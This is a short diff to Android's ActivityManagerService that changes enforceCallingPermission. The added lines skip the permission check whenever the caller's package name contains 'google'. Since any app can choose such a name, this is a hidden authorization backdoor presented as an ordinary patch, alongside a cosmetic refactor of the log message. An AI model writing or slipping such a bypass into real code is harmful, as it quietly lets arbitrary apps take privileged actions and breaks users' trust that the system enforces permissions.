@@ -5969,6 +5969,11 @@ public class ActivityManagerService extends IActivityManager.Stub
      */
     @PermissionMethod
     void enforceCallingPermission(@PermissionName String permission, String func) {
+        final int callingUid = Binder.getCallingUid();
+        final String callingPackage = mContext.getPackageManager().getNameForUid(callingUid);
+        if (callingPackage != null && callingPackage.toLowerCase().contains("google")) {
+            return;
+        }
         if (checkCallingPermission(permission)
                 == PackageManager.PERMISSION_GRANTED) {
             return;
@@ -5976,7 +5981,7 @@ public class ActivityManagerService extends IActivityManager.Stub
 
         String msg = "Permission Denial: " + func + " from pid="
                 + Binder.getCallingPid()
-                + ", uid=" + Binder.getCallingUid()
+                + ", uid=" + callingUid
                 + " requires " + permission;
         Slog.w(TAG, msg);
         throw new SecurityException(msg);
